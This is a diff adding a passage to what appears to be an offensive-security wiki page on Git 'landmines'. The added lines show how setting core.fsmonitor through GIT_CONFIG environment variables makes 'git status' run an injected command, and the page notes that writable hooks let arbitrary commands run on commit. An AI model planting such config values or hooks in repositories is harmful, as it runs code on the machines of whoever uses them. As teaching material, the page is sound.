@@ -105,6 +105,15 @@ Many shell extensions like [Starship](https://github.com/starship/starship/issue
 Create a repository with `.git/config` and `hooks` GIT landmines (`lib/payload` = payload)
 {% endembed %}
 
+This same config variable can be set via environment variables:
+
+```bash
+export GIT_CONFIG_COUNT=1
+export GIT_CONFIG_KEY_0=core.fsmonitor
+export GIT_CONFIG_VALUE_0="id | tee /tmp/pwned > /dev/tty"
+git status
+```
+
 ### Git Hooks
 
 There is another feature called "hooks" that allow you to run bash scripts when a certain action happens with the repository. When a `git commit` is executed, for example, the `pre-commit` hook gets triggered. If you can write these hooks you can let whoever runs the `git commit` execute arbitrary commands.&#x20;
